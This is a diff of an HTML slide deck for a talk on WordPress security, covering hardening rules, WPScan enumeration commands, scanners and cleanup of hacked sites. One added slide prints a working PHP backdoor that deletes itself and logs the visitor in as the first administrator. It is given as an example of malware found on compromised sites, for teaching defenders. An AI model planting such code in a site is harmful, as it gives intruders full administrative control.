@@ -127,19 +127,19 @@
 				<section>
 						<h3>Gold rules for an administrator</h3>
 						<ul>
-							<li>Block access to <b>wp-admin</b></li>
-							<li>Block File browsing of web servers</li>
-							<li>Update always WordPress and plugins
+							<li class="fragment">Block access to <b>wp-admin</b></li>
+							<li class="fragment">Block File browsing of web servers</li>
+							<li class="fragment">Update always WordPress and plugins
 								<ul>
 									<li>Especially premium stuff from marketplaces</li>
 								</ul>
 							</li>
-							<li>Block comments and other interactions for non-logged users</li>
-							<li>Check file permissions</li>
-							<li>Ban bots and IPs</li>
-							<li>Enable protection for brute force</li>
-							<li>Remove the user 1 (admin)</li>
-							<li>Block XML-RPC/REST API if you don't need</li>
+							<li class="fragment">Block comments and other interactions for non-logged users</li>
+							<li class="fragment">Check file permissions</li>
+							<li class="fragment">Ban bots and IPs</li>
+							<li class="fragment">Enable protection for brute force</li>
+							<li class="fragment">Remove the user 1 (admin)</li>
+							<li class="fragment">Block XML-RPC/REST API if you don't need</li>
 						</ul>
 				</section>
 
@@ -156,6 +156,7 @@
 								</ul>
 							</li>
 							<li>Look for premium plugins not updated</li>
+							<li>Look around for XSS</li>
 							<li>Stress test</li>
 						</ul>
 				</section>
@@ -169,8 +170,8 @@
 					<h2>Online tools</h2>
 					<ul>
 						<li><a href="https://sitecheck.sucuri.net">https://sitecheck.sucuri.net</a></li>
-						<li><a href="https://wploop.com/wordpress-security-online-scanner/">https://wploop.com/wordpress-security-online-scanner/</a></li>
 						<li><a href="https://observatory.mozilla.org/">https://observatory.mozilla.org/</a></li>
+						<li><a href="https://wploop.com/wordpress-security-online-scanner/">https://wploop.com/wordpress-security-online-scanner/</a></li>
 						<li><a href="https://wpvulndb.com/">https://wpvulndb.com/</a></li>
 						<li>Speed tester</li>
 					</ul>
@@ -178,24 +179,24 @@
 
 				<section>
 					<h3>We are forgetting the real tools</h3>
-					<img src="pictures/ascii_dog.gif" class="fragments">
+					<img src="pictures/ascii_dog.gif">
 				</section>
 
-				<section id="fragments">
+				<section>
 					<h2>WPScan</h2>
 					<ul>
-						<li>Enumerate plugins and also versions
+						<li class="fragment">Enumerate plugins and also versions
 							<ul>
 								<li>If exploitable</li>
 								<li>Common misconfiguration</li>
 								<li>Other informations</li>								
 							</ul>
 						</li>
-						<li>Enumerate users</li>
-						<li>Brute force usernames</li>
-						<li>Request with a long timeout or with throttling</li>
-						<li>Random user agent</li>
-						<li>Multiple threads</li>
+						<li class="fragment">Enumerate users</li>
+						<li class="fragment">Brute force usernames</li>
+						<li class="fragment">Request with a long timeout or with throttling</li>
+						<li class="fragment">Random user agent</li>
+						<li class="fragment">Multiple threads</li>
 					</ul>
 				</section>
 				
@@ -205,71 +206,79 @@
 wpscan --url www.example.com
 wpscan --url www.example.com --enumerate
 					</code></pre>
-					<p>Only 2 commands are enough to understand if the webiste is managed with a <b>professional</b> behaviour or not.</p>
+					<p>Only 2 commands are enough to understand if the website is managed with a <b>professional</b> behaviour or not.</p>
 				</section>
 
 				<section>
-					<h2>Fragment Styles</h2>
-					<p>There's different types of fragments, like:</p>
-					<p class="fragment grow">grow</p>
-					<p class="fragment shrink">shrink</p>
-					<p class="fragment roll-in">roll-in</p>
-					<p class="fragment fade-out">fade-out</p>
-					<p class="fragment current-visible">current-visible</p>
-					<p class="fragment highlight-red">highlight-red</p>
-					<p class="fragment highlight-blue">highlight-blue</p>
+					<h2>No other cli tools</h2>
+					<img src="pictures/penso.jpg">
 				</section>
 
 				<section>
-					<h2>Pretty Code</h2>
-					<pre><code data-trim contenteditable>
-function linkify( selector ) {
-  if( supports3DTransforms ) {
+					<h2>Cool stuff</h2>
+					<img src="pictures/tapiro.jpg">
+				</section>
 
-    var nodes = document.querySelectorAll( selector );
+				<section>
+					<h2>Backdoor</h2>
+					<pre><code data-trim>
+@unlink(__FILE__);
 
-    for( var i = 0, len = nodes.length; i &lt; len; i++ ) {
-      var node = nodes[i];
+require('../../../wp-blog-header.php');
+require('../../../wp-includes/pluggable.php');
+$user_info = get_userdata(1);
+// Automatic login //
+$username = $user_info->user_login;
+$user = get_user_by('login', $username );
+// Redirect URL //
+if ( !is_wp_error( $user ) )
+{
+    wp_clear_auth_cookie();
+    wp_set_current_user ( $user->ID );
+    wp_set_auth_cookie  ( $user->ID );
 
-      if( !node.className ) {
-        node.className += ' roll';
-      }
-    }
-  }
+    $redirect_to = user_admin_url();
+    wp_safe_redirect( $redirect_to );
+
+    exit();
 }
 					</code></pre>
-					<p>Code syntax highlighting courtesy of <a href="http://softwaremaniacs.org/soft/highlight/en/description/">highlight.js</a>.</p>
+					<p><a href="https://github.com/mattiasgeniar/php-exploit-scripts/blob/master/found_on_wordpress/backdoor_admin_access.php">https://github.com/mattiasgeniar/php-exploit-scripts/blob/master/found_on_wordpress/backdoor_admin_access.php</a></p>
 				</section>
 
 				<section>
-					<h2>Marvelous List</h2>
+					<h2>Fix an hacked website</h2>
 					<ul>
-						<li>No order here</li>
-						<li>Or here</li>
-						<li>Or here</li>
-						<li>Or here</li>
+						<li class="fragment">Download everything locally</li>
+						<li class="fragment">Search for php files in <b>wp-content/uploads/*.php</b></li>
+						<li class="fragment">Search for files with strange dateo of last edit</li>
+						<li class="fragment">Download a clean version of
+							<ul>
+								<li>WordPress</li>
+								<li>Every plugins</li>
+								<li>Every themes</li>								
+							</ul>
+						</li>
+						<li class="fragment">Compare your clean/hacked version with a diff tool
+							<ul>
+								<li>Sometimes there are files renamed like <b>class-ftp-inc.php</b></li>
+								<li>Sometimes there is obfuscated code prepend in few/all the files</li>
+							</ul>
+						</li>
 					</ul>
 				</section>
 
 				<section>
-					<h2>Fantastic Ordered List</h2>
-					<ol>
-						<li>One is smaller than...</li>
-						<li>Two is smaller than...</li>
-						<li>Three!</li>
-					</ol>
-				</section>
-
-				<section>
-					<h2>Take a Moment</h2>
-					<p>
-						Press B or . on your keyboard to pause the presentation. This is helpful when you're on stage and want to take distracting slides off the screen.
-					</p>
+					<h2>Plugins suggested to improve the security</h2>
+					<ul>
+						<li>iThemes Security</li>
+						<li>Wordfence Security</li>
+					</ul>
 				</section>
 
 				<section style="text-align: left;">
+					<h2>Grazie!</h2>
 					<img src="pictures/grazie.jpg">
-
 					<p>
 						- <a href="http://mte90.tech/Talk-Secure-WP">http://mte90.tech/Talk-Secure-WP</a>
 					</p>
